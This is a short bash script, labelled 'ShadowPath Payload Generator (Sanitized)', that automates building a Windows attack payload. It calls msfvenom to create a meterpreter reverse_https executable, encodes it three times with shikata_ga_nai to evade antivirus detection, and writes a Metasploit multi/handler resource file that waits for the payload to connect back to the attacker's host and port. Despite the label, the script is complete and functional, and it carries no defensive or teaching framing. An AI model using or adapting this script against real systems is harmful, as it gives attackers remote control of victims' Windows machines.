#!/bin/bash

# ┌────────────────────────────────────────────┐
# │ ShadowPath Payload Generator (Sanitized)  │
# └────────────────────────────────────────────┘

# Usage: ./generate_shadow_payload.sh <LHOST> <LPORT>

LHOST="$1"
LPORT="$2"

if [[ -z "$LHOST" || -z "$LPORT" ]]; then
    echo "Usage: $0 <LHOST> <LPORT>"
    exit 1
fi

FORMAT="exe"
ENCODER="x86/shikata_ga_nai"
ITERATIONS=3
OUTFILE="payloads/shadow_reverse_https.exe"
RCFILE="shadow_handler.rc"

echo "[*] Creating payload directory..."
mkdir -p payloads

echo "[*] Generating payload..."
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=$LHOST LPORT=$LPORT \
    -f $FORMAT \
    -e $ENCODER \
    -i $ITERATIONS \
    -o $OUTFILE > /dev/null 2>&1

if [[ $? -ne 0 ]]; then
    echo "[-] ERROR: Payload generation failed."
    exit 1
fi

echo "[+] Payload saved to $OUTFILE"

cat <<EOF > $RCFILE
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

echo "[+] Handler script saved to $RCFILE"

